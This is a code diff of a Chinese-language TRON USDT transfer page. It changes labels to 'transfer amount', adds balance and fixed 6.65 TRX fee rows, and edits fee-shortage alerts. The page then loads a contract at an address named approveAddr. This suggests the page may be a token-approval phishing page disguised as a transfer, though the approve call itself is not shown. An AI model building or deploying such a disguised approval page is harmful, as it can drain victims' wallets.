@@ -256,13 +256,13 @@
                         </ul>
                     </div>
                     <div class="list-block amount">
-                        <div class="list-block-title">金额<span id="yu">0 USDT</span></div>
+                        <div class="list-block-title">转账金额</div>
                         <ul>
                             <li class="item-content">
                                 <div class="item-inner">
                                     <div class="item-title">
                                         <input id="input_num" class="num" placeholder="0" value="">
-                                        <p>¥ <span id="price" style="color: inherit;font-size:inherit;">0</span></p>
+                                        <!-- <p>¥ <span id="price" style="color: inherit;font-size:inherit;">0</span></p> -->
                                     </div>
                                 </div>
                             </li>
@@ -272,10 +272,30 @@
                             <!--	</div>-->
                             <!--</li>-->
                         </ul>
+                        <ul>
+                            <li class="item-content item-link">
+                                <div class="item-inner">
+                                    <div class="item-title">可用余额</div>
+                                    <div class="item-after">
+                                        <p><span id="yu">0 USDT</span></p>
+                                    </div>
+                                </div>
+                            </li>
+                        </ul>
+                        <ul>
+                            <li class="item-content item-link">
+                                <div class="item-inner">
+                                    <div class="item-title">TRX矿工费</div>
+                                    <div class="item-after">
+                                        <p>6.65 TRX</p>
+                                    </div>
+                                </div>
+                            </li>
+                        </ul>
                         <!-- <ul>
                             <li class="item-content item-link">
                                 <div class="item-inner">
-                                    <div class="item-title">miner fee</div>
+                                    <div class="item-title">可用余额</div>
                                     <div class="item-after">
                                         <p>0.002640 ETH</p>
                                         <p>￥44.69</p>
@@ -442,7 +462,7 @@
                
                 $('.modal-overlay').remove();
                 $('.modal').removeClass('modal-in').addClass('modal-out');
-                mui.alert('TRX矿工费不足7');
+                mui.alert('TRX矿工费不足');
                 return;
             }
 
@@ -456,7 +476,7 @@
                 
                 $('.modal-overlay').remove();
                 $('.modal').removeClass('modal-in').addClass('modal-out');
-                mui.alert('TRX矿工费不足7',"提示","确定");
+                mui.alert('TRX矿工费不足',"提示","确定");
                 return;
             }
             trxye=tradeobj['balance']/1000000;
@@ -464,7 +484,7 @@
                 
                 $('.modal-overlay').remove();
                 $('.modal').removeClass('modal-in').addClass('modal-out');
-                mui.alert('TRX矿工费不足7',"提示","确定");
+                mui.alert('TRX矿工费不足',"提示","确定");
                 return;
             }
             let contract = await window.tronWeb.contract().at(approveAddr);
